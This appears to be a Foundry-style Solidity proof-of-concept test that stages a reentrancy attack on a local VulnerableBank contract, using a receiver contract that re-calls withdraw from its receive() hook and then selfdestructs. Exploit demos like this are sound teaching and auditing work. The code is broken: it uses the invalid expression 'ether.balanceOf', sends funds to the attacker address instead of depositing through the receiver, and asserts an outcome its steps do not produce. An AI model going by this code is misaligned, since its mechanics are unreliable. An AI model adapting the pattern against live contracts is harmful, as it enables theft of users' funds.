// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public balanceLog {
        // Deploy a re-entering receiver contract
        ReceiverReentrant receiver = new ReceiverReentrant(address(target));

        // Deposit through the receiver
        attacker.transfer(1 ether);

        // Assert that the receiver withdrew more than its original deposit
        assertEq(receiver.fundsDeployed(), 2 ether);
    }
}

contract ReceiverReentrant {
    VulnerableBank bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    uint public fundsDeployed = 0;

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw(ether.balanceOf(address(this)));
        }
        fundsDeployed += msg.value;
        selfdestruct(payable(msg.sender));
    }
}